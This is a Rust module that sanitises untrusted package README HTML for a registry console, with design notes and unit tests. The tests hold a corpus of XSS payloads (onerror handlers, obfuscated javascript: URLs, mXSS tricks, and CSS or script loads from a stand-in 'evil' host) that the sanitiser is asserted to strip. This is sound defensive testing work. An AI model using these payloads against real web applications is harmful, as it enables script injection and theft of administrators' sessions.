//! The allow-list, and the only path from a package's text to the console.
//!
//! This is the highest-risk surface the console has: anyone who can publish to a
//! proxied upstream can author the input, and the output is rendered on the
//! console's own origin to a session that is frequently an administrator's. So
//! the model is **deny by default** — an allow-list over an `html5ever` parse,
//! not a regex and not an escape pass — and there is no path from source to
//! output that skips this module. The fuzz target
//! (`fuzz/fuzz_targets/fuzz_readme_render.rs`) exists to keep it that way.
//!
//! What an attacker gains and what they already had is worth stating: a
//! malicious package already runs code on a developer's machine at install time,
//! and that is what the firewall rules, the release-age gate and the advisories
//! address. What is genuinely new here is a path from *publishing text* to
//! *markup in an operator's authenticated session* (RFC 0007 §7.2).

use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex, PoisonError};

use crate::services::hot_config::RemoteImagePolicy;

/// The version of the render + sanitise pipeline.
///
/// Part of the render cache key, so a fix here invalidates every stored
/// rendering in one commit with no backfill — which is the whole reason the
/// store keeps the *source* rather than the HTML (RFC 0007 §5.3).
///
/// **Bump this whenever the allow-list, the link handling, the image handling or
/// the markdown extension set changes.** A sanitiser fix that did not bump it
/// would leave every already-rendered README serving the vulnerable output until
/// its cache entry expired on its own.
///
/// History: `2` chips raw-HTML `<img>` — and therefore `<picture>` — instead of
/// letting it render to nothing (RFC 0007-bis §13.1). `3` rewrites a proxied
/// image's `src` to `{prefix}{index}` rather than to a query-encoded URL, which
/// is what lets the image endpoint take no URL at all (RFC 0007-bis §5.1). `4`
/// keeps `align` on block elements (see [`ALIGNABLE_TAGS`]) and stops dropping a
/// kept image's alt text — two output changes, and the render cache holds its
/// entries with **no TTL**, so without this bump every README already rendered
/// would go on serving the old markup indefinitely. `5` made the chip an `<a>`
/// to the image's own URL; `6` reverts that — the chip is a `<span>` again, and
/// the number moves *forward* rather than back to `4`, because what has to be
/// invalidated is every rendering made under `5`.
pub const RENDERER_VERSION: u32 = 6;

/// The class the renderer puts on the chip that replaces a stripped image.
///
/// Allow-listed by name rather than by pattern: a package author writing this
/// same class themselves gets a chip that looks like ours and says nothing they
/// could not have said in plain text, which is harmless — while `class="*"`
/// would hand them the console's whole stylesheet.
pub const STRIPPED_IMAGE_CLASS: &str = "readme-stripped-image";

/// The fence classes that survive the pass.
///
/// `pulldown-cmark` writes the fence's info string onto the `code` element, and
/// this list is the only reason any of it reaches the console: `class` is not in
/// `tag_attributes`, so a README's own classes are dropped wholesale (see the
/// note beside `allowed_classes` below). Without it the panel receives
/// `<pre><code>` with the language erased and has nothing to highlight — found
/// by rendering `chalk`, whose README fences a dozen `js` blocks and arrived
/// with every one of them anonymous.
///
/// **Whole class names, enumerated**, rather than a `language-*` pattern:
/// `allowed_classes` takes exact values, and the threat model wants exact values
/// too — `language-*` sounds harmless until it is a selector some stylesheet
/// matches. Written out rather than built with `format!` because the builder is
/// `Builder<'static>` and these must outlive it.
///
/// A fence in a language nobody listed renders as a plain block, which is what
/// an unhighlighted block is anyway. The console's highlighter knows a superset
/// (`ui/src/composables/useShiki.ts`) and treats an unknown class as plain, so
/// the two lists may differ without either side breaking: this one decides what
/// is *said*, that one what can be *drawn*.
const HIGHLIGHT_LANGUAGE_CLASSES: &[&str] = &[
    "language-bash",
    "language-c",
    "language-console",
    "language-cpp",
    "language-csharp",
    "language-css",
    "language-diff",
    "language-dockerfile",
    "language-go",
    "language-graphql",
    "language-html",
    "language-ini",
    "language-java",
    "language-javascript",
    "language-js",
    "language-json",
    "language-jsonc",
    "language-jsx",
    "language-kotlin",
    "language-lua",
    "language-markdown",
    "language-php",
    "language-python",
    "language-ruby",
    "language-rust",
    "language-scala",
    "language-sh",
    "language-shell",
    "language-shellscript",
    "language-sql",
    "language-swift",
    "language-terraform",
    "language-toml",
    "language-ts",
    "language-tsx",
    "language-typescript",
    "language-xml",
    "language-yaml",
    "language-yml",
];

/// Every element a README may contain.
///
/// Everything else is dropped, including `script`, `iframe`, `object`, `embed`,
/// `form`, `input` and `svg`. `style` goes entirely — both the element and the
/// attribute — because CSS is not decoration in this threat model: it is the
/// mechanism for overlaying the console's own controls, and attribute selectors
/// are an exfiltration channel.
const ALLOWED_TAGS: &[&str] = &[
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "p",
    "br",
    "hr",
    "em",
    "strong",
    "del",
    "s",
    "sub",
    "sup",
    "ul",
    "ol",
    "li",
    "blockquote",
    "pre",
    "code",
    "table",
    "thead",
    "tbody",
    "tfoot",
    "tr",
    "th",
    "td",
    "a",
    "img",
    "span",
    "div",
    "details",
    "summary",
    "input",
];

/// Elements whose `align` a README may keep.
///
/// A centred badge row written as `<p align="center">` is the single most common
/// piece of raw HTML in a README, and dropping the attribute renders it
/// left-aligned — the document displayed differently from how its author wrote
/// it, for no stated reason. `td`/`th` already carried `align` for the same
/// reason on a smaller scale.
///
/// **Why this is not the `style` exception in disguise.** `style` is refused
/// because CSS in this threat model is the mechanism for overlaying the
/// console's own controls, and attribute selectors are an exfiltration channel.
/// `align` is neither: it is an *enumerated* attribute whose entire effect is the
/// `text-align` presentational hint, so it cannot position, layer, size or
/// select anything. A value the browser does not recognise is ignored rather
/// than applied, and ammonia escapes what it writes, so there is no value here
/// that means more than "put the text left, right, centre or justified".
///
/// The panel does not rely on that hint being honoured: `ReadmePanel.vue` maps
/// the attribute to `text-align` itself, so the rendering is the same whatever a
/// browser does with obsolete presentational attributes.
const ALIGNABLE_TAGS: &[&str] = &["p", "div", "h1", "h2", "h3", "h4", "h5", "h6", "td", "th"];

/// Build the sanitiser for one registry's policy.
///
/// A fresh `Builder` per call rather than a lazily-initialised static: the
/// configuration differs per registry (`remote_images`), the render cache means
/// this runs once per distinct document rather than once per page view, and a
/// shared mutable builder is a footgun in a hot-reloadable server.
///
/// `captured` receives the original URL of every image whose `src` this rewrote,
/// in the order it rewrote them. That order **is** the numbering the browser asks
/// back with, which is why the recording lives inside the filter rather than in a
/// second walk that could drift from it (RFC 0007-bis §5.1).
fn builder(
    policy: RemoteImagePolicy,
    image_proxy_prefix: Option<&str>,
    captured: &ImageSink,
) -> ammonia::Builder<'static> {
    let mut b = ammonia::Builder::default();

    let mut tags: HashSet<&str> = ALLOWED_TAGS.iter().copied().collect();
    // With images stripped, `img` is not in the allow-list at all: an element
    // whose only purpose is to issue a request must not survive the pass that
    // decides what may issue requests. GFM images become chips before they get
    // here (see `render.rs`); an `Html`-format README's images are dropped,
    // which is a smaller loss than a beacon.
    if policy == RemoteImagePolicy::Strip || image_proxy_prefix.is_none() {
        tags.remove("img");
    }
    b.tags(tags);

    // `style` is not an attribute a README may carry, anywhere. `id` is
    // allowed only so that `id_prefix` below can namespace it — an id that were
    // dropped outright would break every in-document anchor a long README has.
    b.generic_attributes(HashSet::from(["title", "id"]));
    let mut attributes: HashMap<&str, HashSet<&str>> = HashMap::from([
        ("a", HashSet::from(["href"])),
        ("img", HashSet::from(["src", "alt", "width", "height"])),
        ("td", HashSet::from(["align", "colspan", "rowspan"])),
        ("th", HashSet::from(["align", "colspan", "rowspan"])),
        ("ol", HashSet::from(["start"])),
        // GFM task lists render as disabled checkboxes. `type` and `checked`
        // only, and `disabled` is forced below — an enabled input inside a
        // README is a form control an operator could be tricked into using.
        ("input", HashSet::from(["type", "checked"])),
    ]);
    for tag in ALIGNABLE_TAGS {
        attributes.entry(tag).or_default().insert("align");
    }
    b.tag_attributes(attributes);
    // *Set*, not merely allow: `add_tag_attribute_values` would permit the
    // value if the author wrote it, which is the opposite of what is wanted.
    b.set_tag_attribute_value("input", "disabled", "");
    // Only our own class names survive; a package author's `class="…"` is
    // dropped rather than being handed the console's stylesheet. `class` is
    // deliberately absent from `tag_attributes` above — ammonia asserts the two
    // are mutually exclusive, because listing it there would let *any* value
    // through and make this allow-list decorative.
    b.allowed_classes(HashMap::from([
        ("span", HashSet::from([STRIPPED_IMAGE_CLASS])),
        // The fence language, and nothing else a README author writes on a
        // `code` element — see `HIGHLIGHT_LANGUAGES`.
        ("code", HIGHLIGHT_LANGUAGE_CLASSES.iter().copied().collect()),
    ]));

    // `javascript:`, `data:` and `vbscript:` are dropped rather than rewritten.
    // `data:` is dropped for images too, despite the CSP permitting it: a data
    // URI in a README is megabytes of base64 in a database row, and an SVG data
    // URI is script.
    b.url_schemes(HashSet::from(["http", "https", "mailto"]));

    // Unprefixed ids from untrusted markup shadow `document.getElementById` and
    // named-access properties on `window` — DOM clobbering — and can hijack the
    // page's own anchor targets.
    b.id_prefix(Some("readme-"));

    // A README cannot reach back through `window.opener`, and cannot lend the
    // instance's reputation to a link farm.
    b.link_rel(Some("nofollow ugc noopener noreferrer"));
    b.set_tag_attribute_value("a", "target", "_blank");

    // A relative `src`/`href` in a README has no base to resolve against — the
    // package's own repository is not this origin — so it is dropped rather
    // than resolved into a link to somewhere on the console.
    b.url_relative(ammonia::UrlRelative::Deny);

    if let (RemoteImagePolicy::Proxy, Some(prefix)) = (policy, image_proxy_prefix) {
        // Every remote image is rewritten to go through this server, so the
        // reader's browser never talks to a host the package author chose. The
        // prefix is built by the caller from the request's own base URL.
        //
        // An attribute filter rather than `UrlRelative::RewriteWithBase`, which
        // only rebases *relative* URLs and would leave an absolute badge URL
        // pointing straight at the third-party host — the beacon this exists to
        // remove.
        let prefix = prefix.to_owned();
        let sink = Arc::clone(captured);
        b.attribute_filter(move |element, attribute, value| {
            if element != "img" || attribute != "src" {
                return Some(std::borrow::Cow::Borrowed(value));
            }
            // Read the way a browser reads it: a scheme is ASCII
            // case-insensitive and surrounding whitespace is stripped before
            // the reference is resolved. Compared byte-exactly,
            // `src="HTTPS://cdn.example/logo.png"` and `src=" https://…"` fell
            // through to the `None` below — the `src` was dropped, no index was
            // reserved, and the image disappeared with nothing said, which is
            // the same silent failure `proxy_prefix` refuses a relative prefix
            // to prevent. The *trimmed* value is what is recorded, because it is
            // what the fetcher will be handed.
            let candidate = value.trim();
            let lower = candidate.to_ascii_lowercase();
            if lower.starts_with("http://") || lower.starts_with("https://") {
                let index = {
                    let mut urls = sink.lock().unwrap_or_else(PoisonError::into_inner);
                    urls.push(candidate.to_owned());
                    urls.len() - 1
                };
                return Some(std::borrow::Cow::Owned(format!("{prefix}{index}")));
            }
            // A relative or `data:` src has nothing to proxy: dropped, which
            // leaves an `img` with no `src` for the panel to hide. Deliberately
            // *not* counted — the rendering emitted no index for it, so the
            // endpoint will never be asked for one, and reserving a number here
            // would shift every later image by one.
            None
        });
    }

    b
}

/// Where [`builder`] records the URLs it rewrote.
///
/// A mutex because `ammonia`'s attribute filter is `Fn + Send + Sync`, not
/// `FnMut`. There is no contention to speak of: one sanitise pass owns the sink
/// and the lock is held for a push.
type ImageSink = Arc<Mutex<Vec<String>>>;

/// Sanitise `html` for display on the console origin.
///
/// The single choke point. Raw HTML inside markdown reaches this too:
/// `pulldown-cmark` passes it through, and it goes to the same allow-list as an
/// `Html`-format document.
pub fn sanitize(html: &str, policy: RemoteImagePolicy, image_proxy_prefix: Option<&str>) -> String {
    sanitize_capturing_images(html, policy, image_proxy_prefix).0
}

/// [`sanitize`], plus the original URLs of the images it rewrote, in order.
///
/// The vector's indices are exactly the ones that appear in the output's `src`
/// attributes, because both come out of the same pass over the same document.
/// That is the entire safety argument for an image endpoint addressed by index
/// rather than by URL: there is no second walk to disagree with the first
/// (RFC 0007-bis §5.1).
///
/// Empty under `strip`, where nothing is rewritten because no `img` survives.
pub fn sanitize_capturing_images(
    html: &str,
    policy: RemoteImagePolicy,
    image_proxy_prefix: Option<&str>,
) -> (String, Vec<String>) {
    let captured: ImageSink = Arc::new(Mutex::new(Vec::new()));
    let cleaned = builder(policy, image_proxy_prefix, &captured)
        .clean(html)
        .to_string();
    let urls = std::mem::take(&mut *captured.lock().unwrap_or_else(PoisonError::into_inner));
    (cleaned, urls)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn clean(html: &str) -> String {
        sanitize(html, RemoteImagePolicy::Strip, None)
    }

    // ── The standard vectors ──────────────────────────────────────────────────
    //
    // Each asserts the *specific* removal, not merely "no script": a test that
    // only greps for `<script` passes on output that still carries an `onerror`.

    /// The fence language reaches the console, and nothing else on that element
    /// does.
    ///
    /// Both halves matter. Without the first, every code block in every README
    /// arrives anonymous and the panel has nothing to highlight — which is how
    /// `chalk`'s dozen `js` fences rendered grey. Without the second, `class` on
    /// a `code` element would be a README author's handle on the console's own
    /// stylesheet, which is what the note beside `allowed_classes` refuses.
    #[test]
    fn a_known_fence_language_survives_and_an_arbitrary_class_does_not() {
        let out = clean(r#"<pre><code class="language-rust">fn main() {}</code></pre>"#);
        assert!(out.contains(r#"class="language-rust""#), "{out}");

        for hostile in [
            r#"<pre><code class="sidebar-open">x</code></pre>"#,
            r#"<pre><code class="language-rust sidebar-open">x</code></pre>"#,
            r#"<p class="language-rust">x</p>"#,
        ] {
            let out = clean(hostile);
            assert!(!out.contains("sidebar-open"), "{out}");
        }
    }

    /// A language nobody listed is a plain block, not a passed-through class.
    ///
    /// Ammonia empties the attribute rather than removing it, so the assertion
    /// is on the *value*: `class=""` carries nothing, and asserting the absence
    /// of the attribute would be asserting ammonia's formatting rather than this
    /// policy.
    #[test]
    fn an_unlisted_fence_language_is_dropped_rather_than_echoed() {
        let out = clean(r#"<pre><code class="language-brainfuck">+++</code></pre>"#);
        assert!(out.contains("+++"), "{out}");
        assert!(!out.contains("brainfuck"), "{out}");
    }

    #[test]
    fn script_elements_are_removed_with_their_contents() {
        let out = clean("<p>before</p><script>alert(1)</script><p>after</p>");
        assert!(!out.contains("script"), "{out}");
        assert!(!out.contains("alert"), "{out}");
        assert!(out.contains("before") && out.contains("after"), "{out}");
    }

    #[test]
    fn event_handler_attributes_are_removed() {
        let out = clean(r#"<p onclick="steal()">text</p><a href="/x" onmouseover="x">l</a>"#);
        assert!(!out.contains("onclick"), "{out}");
        assert!(!out.contains("onmouseover"), "{out}");
        assert!(out.contains("text"), "{out}");
    }

    /// A centred badge row is the commonest raw HTML in a README, and it stays
    /// centred. `align` is allowed on block elements because its whole effect is
    /// the `text-align` hint — see `ALIGNABLE_TAGS`.
    #[test]
    fn align_survives_on_the_blocks_a_readme_centres() {
        for tag in ["p", "div", "h1", "h2", "h3", "h4", "h5", "h6"] {
            let out = clean(&format!(r#"<{tag} align="center">badges</{tag}>"#));
            assert!(
                out.contains(r#"align="center""#),
                "{tag} should keep align: {out}"
            );
        }
    }

    /// Allowing `align` must not have opened the door it is carefully distinct
    /// from: `style` is the overlay mechanism, and it stays out — on the very
    /// elements that just gained an attribute.
    #[test]
    fn align_did_not_bring_style_with_it() {
        let out = clean(
            r#"<p align="center" style="position:fixed;top:0">x</p>
               <div align="center" style="opacity:0">y</div>"#,
        );
        assert!(!out.contains("style"), "{out}");
        assert!(!out.contains("position"), "{out}");
        assert!(out.contains(r#"align="center""#), "{out}");
    }

    #[test]
    fn an_img_onerror_cannot_survive_in_any_form() {
        let out = clean(r#"<img src="x" onerror="alert(1)">"#);
        assert!(!out.contains("onerror"), "{out}");
        assert!(!out.contains("<img"), "{out}");
    }

    #[test]
    fn javascript_and_data_and_vbscript_urls_are_dropped() {
        for href in [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "data:text/html;base64,PHNjcmlwdD4=",
            "vbscript:msgbox(1)",
            // An entity-encoded scheme is the same scheme.
            "&#106;avascript:alert(1)",
        ] {
            let out = clean(&format!(r#"<a href="{href}">click</a>"#));
            assert!(!out.contains("javascript"), "{href} → {out}");
            assert!(!out.contains("vbscript"), "{href} → {out}");
            assert!(!out.contains("data:"), "{href} → {out}");
            // The text survives; only the link goes.
            assert!(out.contains("click"), "{href} → {out}");
        }
    }

    #[test]
    fn http_https_and_mailto_links_survive() {
        for href in [
            "https://example.com/x",
            "http://example.com/x",
            "mailto:x@example.com",
        ] {
            let out = clean(&format!(r#"<a href="{href}">click</a>"#));
            assert!(out.contains(href), "{href} → {out}");
        }
    }

    /// CSS is not decoration in this threat model: it is the mechanism for
    /// overlaying the console's own controls, and attribute selectors are an
    /// exfiltration channel.
    #[test]
    fn style_goes_entirely_element_and_attribute() {
        let out = clean(
            r#"<style>a[href^="http"]{background:url(//evil/?)}</style>
               <p style="position:fixed;inset:0;z-index:9999">covering</p>"#,
        );
        assert!(!out.contains("style"), "{out}");
        assert!(!out.contains("evil"), "{out}");
        assert!(out.contains("covering"), "{out}");
    }

    #[test]
    fn svg_iframe_object_embed_and_form_are_all_dropped() {
        let out = clean(
            r#"<svg><script>alert(1)</script></svg>
               <iframe srcdoc="<script>alert(1)</script>"></iframe>
               <object data="x"></object><embed src="x">
               <form action="/x"><input name="p" type="password"></form>"#,
        );
        for forbidden in ["svg", "iframe", "srcdoc", "object", "embed", "<form"] {
            assert!(!out.contains(forbidden), "{forbidden} survived: {out}");
        }
    }

    /// Unprefixed ids from untrusted markup shadow `document.getElementById`
    /// and named-access properties on `window`, and can hijack the page's own
    /// anchor targets.
    #[test]
    fn ids_are_prefixed_so_they_cannot_clobber_the_consoles_own() {
        let out = clean(r#"<div id="app">x</div><h2 id="attributes">y</h2>"#);
        assert!(!out.contains(r#"id="app""#), "{out}");
        assert!(out.contains(r#"id="readme-app""#), "{out}");
        assert!(out.contains(r#"id="readme-attributes""#), "{out}");
    }

    #[test]
    fn links_carry_the_full_rel_and_open_in_a_new_tab() {
        let out = clean(r#"<a href="https://example.com">x</a>"#);
        assert!(out.contains("nofollow"), "{out}");
        assert!(out.contains("ugc"), "{out}");
        assert!(out.contains("noopener"), "{out}");
        assert!(out.contains("noreferrer"), "{out}");
        assert!(out.contains(r#"target="_blank""#), "{out}");
    }

    /// A `<details>` is allowed, and its contents go through the same
    /// allow-list — collapsing hostile markup does not exempt it.
    #[test]
    fn details_is_allowed_but_its_contents_are_not_exempt() {
        let out = clean("<details><summary>more</summary><script>alert(1)</script>ok</details>");
        assert!(out.contains("<details>"), "{out}");
        assert!(out.contains("more") && out.contains("ok"), "{out}");
        assert!(!out.contains("script"), "{out}");
    }

    /// A relative link has no base to resolve against — the package's own
    /// repository is not this origin — so it is dropped rather than turned into
    /// a link to somewhere on the console.
    #[test]
    fn relative_urls_are_dropped_not_resolved_against_the_console() {
        let out = clean(r#"<a href="/api/v1/admin/packages/delete">docs</a>"#);
        assert!(!out.contains("/api/v1/admin"), "{out}");
        assert!(out.contains("docs"), "{out}");
    }

    #[test]
    fn a_package_authors_own_classes_are_dropped() {
        let out = clean(r#"<span class="console-danger-button">Delete</span>"#);
        assert!(!out.contains("console-danger-button"), "{out}");
        assert!(out.contains("Delete"), "{out}");
    }

    /// The chip the renderer emits for a stripped image survives, because the
    /// panel styles it — and it is the only class that does.
    #[test]
    fn the_stripped_image_chip_survives() {
        let out = clean(&format!(
            r#"<span class="{STRIPPED_IMAGE_CLASS}" title="img.shields.io">build status</span>"#
        ));
        assert!(out.contains(STRIPPED_IMAGE_CLASS), "{out}");
        assert!(out.contains("build status"), "{out}");
    }

    /// A GFM task list is a checkbox, and it must not be one an operator can
    /// interact with.
    #[test]
    fn task_list_checkboxes_are_disabled() {
        let out = clean(r#"<input type="checkbox" checked>"#);
        assert!(out.contains("disabled"), "{out}");
        // And a text input is still an input element, so it is disabled too —
        // there is no form for it to submit to, since `form` is dropped.
        let out = clean(r#"<input type="password" name="p">"#);
        assert!(!out.contains(r#"name="p""#), "{out}");
    }

    /// With images proxied, `img` survives and its `src` is rewritten to this
    /// server — so the reader's browser still never talks to a host the package
    /// author chose.
    #[test]
    fn proxied_images_are_rewritten_through_this_server() {
        let (out, urls) = sanitize_capturing_images(
            r#"<img src="https://img.shields.io/badge/x.svg" alt="badge">"#,
            RemoteImagePolicy::Proxy,
            Some("https://hub.example.com/api/v1/readme-image/"),
        );
        assert!(out.contains("<img"), "{out}");
        assert!(out.contains(r#"alt="badge""#), "{out}");
        // The rewritten `src` is the prefix and an *index*. The third-party host
        // does not appear in the document at all — not as a host the browser
        // resolves, and not as a parameter a caller could edit into another one.
        assert!(
            out.contains(r#"src="https://hub.example.com/api/v1/readme-image/0""#),
            "{out}"
        );
        assert!(!out.contains("shields.io"), "{out}");
        // It comes back to the caller instead, which is what the endpoint
        // resolves index `0` against.
        assert_eq!(urls, vec!["https://img.shields.io/badge/x.svg"]);
    }

    /// Indices are document order, and they count only the images that were
    /// actually rewritten. A `src` the filter dropped must not consume a number,
    /// or every image after it would resolve to the wrong URL.
    #[test]
    fn image_indices_are_document_order_and_skip_what_was_not_rewritten() {
        let (out, urls) = sanitize_capturing_images(
            r#"<img src="https://a.example/1.png">
               <p><img src="./relative.png"><img src="https://b.example/2.png"></p>
               <img src="data:image/png;base64,AAAA">
               <img src="https://c.example/3.png">"#,
            RemoteImagePolicy::Proxy,
            Some("https://hub.invalid/i/"),
        );
        assert_eq!(
            urls,
            vec![
                "https://a.example/1.png",
                "https://b.example/2.png",
                "https://c.example/3.png",
            ]
        );
        for n in 0..3 {
            assert!(
                out.contains(&format!(r#"src="https://hub.invalid/i/{n}""#)),
                "index {n}: {out}"
            );
        }
        // The two that were not rewritten kept no `src` at all.
        assert_eq!(out.matches("src=").count(), 3, "{out}");
    }

    /// The prefix has to be **absolute**, and this is why the caller builds it
    /// from the request's own origin rather than writing a path.
    ///
    /// `url_relative(Deny)` is applied to the attribute filter's *output*, not
    /// only to what the author wrote — so a relative prefix produces an `<img>`
    /// with no `src` at all: every image silently invisible, no error anywhere.
    /// `render.rs` refuses a relative prefix before it can happen; this pins the
    /// ammonia behaviour that makes the refusal necessary, so a version bump
    /// that changed it would not go unnoticed.
    #[test]
    fn a_relative_proxy_prefix_would_lose_the_src_entirely() {
        for prefix in ["/api/v1/i/", "i/", "./i/"] {
            let (out, urls) = sanitize_capturing_images(
                r#"<img src="https://a.example/1.png">"#,
                RemoteImagePolicy::Proxy,
                Some(prefix),
            );
            assert!(!out.contains("src="), "{prefix} → {out}");
            // And the URL was still captured, which is the trap: the caller
            // would see one image and the reader would see none.
            assert_eq!(urls.len(), 1, "{prefix} → {urls:?}");
        }
    }

    /// Under `strip` there is nothing to capture, because no `img` survives for
    /// the filter to visit.
    #[test]
    fn stripping_captures_no_images() {
        let (out, urls) = sanitize_capturing_images(
            r#"<img src="https://a.example/1.png">"#,
            RemoteImagePolicy::Strip,
            None,
        );
        assert!(urls.is_empty(), "{urls:?}");
        assert!(!out.contains("<img"), "{out}");
    }

    /// A relative or `data:` src has nothing to proxy, so it is dropped —
    /// `proxy` is not a way to smuggle one through.
    #[test]
    fn a_non_http_src_is_dropped_even_under_proxy() {
        for src in ["./local.png", "data:image/png;base64,AAAA", "/x.png"] {
            let (out, urls) = sanitize_capturing_images(
                &format!(r#"<img src="{src}" alt="x">"#),
                RemoteImagePolicy::Proxy,
                Some("https://hub.example.com/api/v1/readme-image/"),
            );
            assert!(!out.contains("src="), "{src} → {out}");
            assert!(urls.is_empty(), "{src} → {urls:?}");
        }
    }

    /// `proxy` with no prefix to rewrite to is not "load it directly": there is
    /// no configuration in which a README's image reaches out from the reader's
    /// browser.
    #[test]
    fn proxy_without_a_prefix_still_strips() {
        let out = sanitize(
            r#"<img src="https://img.shields.io/badge/x.svg" alt="badge">"#,
            RemoteImagePolicy::Proxy,
            None,
        );
        assert!(!out.contains("<img"), "{out}");
        assert!(!out.contains("shields.io"), "{out}");
    }

    /// Plain text passes through with its markup-significant characters
    /// escaped, rather than being dropped as unknown markup.
    #[test]
    fn text_content_is_escaped_not_discarded() {
        let out = clean("5 < 6 && 7 > 6");
        assert!(out.contains("&lt;"), "{out}");
        assert!(out.contains("&gt;"), "{out}");
    }

    // ── The corpus the fuzz target also runs ─────────────────────────────────

    /// The same invariant `fuzz/fuzz_targets/fuzz_readme_render.rs` asserts, over
    /// a fixed corpus, so it is checked by `cargo test` and not only by a
    /// nightly job somebody has to remember to run.
    ///
    /// The corpus is the shapes that have historically broken allow-list
    /// sanitisers: nesting that confuses a naive parser, mixed-case and
    /// entity-encoded schemes, mXSS through `noscript`/`template`/comment
    /// re-parsing, and attribute values that close their own tag.
    #[test]
    fn no_input_in_the_corpus_produces_script_a_handler_or_a_bad_scheme() {
        const CORPUS: &[&str] = &[
            "<script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</script>",
            "<SCRIPT SRC=//evil/x.js></SCRIPT>",
            "<img src=x onerror=alert(1)>",
            "<img src=`x` onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
            "<a href=\"&#106;avascript:alert(1)\">x</a>",
            "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
            "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            "<template><script>alert(1)</script></template>",
            "<!--<img src=--><img src=x onerror=alert(1)//>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>",
            "<form><button formaction=javascript:alert(1)>x</button></form>",
            "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>",
            "<style>@import \"//evil/x.css\";</style>",
            "<div style=\"background:url(javascript:alert(1))\">x</div>",
            "<input type=image src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>x</details>",
            "<a href=\"//evil\" onclick=\"alert(1)\">x</a>",
            "<p id=app>clobber</p><p id=__proto__>x</p>",
        ];

        // Deeply nested, so the parser's own limits cannot become a bypass by
        // truncating mid-tag.
        let deep = format!(
            "{}<script>alert(1)</script>{}",
            "<div>".repeat(500),
            "</div>".repeat(500)
        );

        for input in CORPUS.iter().copied().chain(std::iter::once(deep.as_str())) {
            for policy in [RemoteImagePolicy::Strip, RemoteImagePolicy::Proxy] {
                let out = sanitize(input, policy, Some("https://hub.invalid/i/"));
                let lower = out.to_ascii_lowercase();
                assert!(!lower.contains("<script"), "{input:?} → {out:?}");
                assert!(!lower.contains("onerror"), "{input:?} → {out:?}");
                assert!(!lower.contains("onload"), "{input:?} → {out:?}");
                assert!(!lower.contains("ontoggle"), "{input:?} → {out:?}");
                assert!(!lower.contains("onbegin"), "{input:?} → {out:?}");
                assert!(!lower.contains("onclick"), "{input:?} → {out:?}");
                assert!(!lower.contains("formaction"), "{input:?} → {out:?}");
                assert!(!lower.contains("srcdoc"), "{input:?} → {out:?}");
                // `="` before the scheme, not `"` alone: a README that
                // discusses `javascript:` in prose keeps the words, and only an
                // attribute value can execute. The fuzz target learned this the
                // hard way — see its comment.
                assert!(!lower.contains("=\"javascript:"), "{input:?} → {out:?}");
                assert!(!lower.contains("=\"data:"), "{input:?} → {out:?}");
                assert!(!lower.contains("style"), "{input:?} → {out:?}");
                // Nothing may carry an unprefixed id out of untrusted markup.
                assert!(!lower.contains("id=\"app\""), "{input:?} → {out:?}");
                assert!(!lower.contains("id=\"__proto__\""), "{input:?} → {out:?}");
            }
        }
    }
}
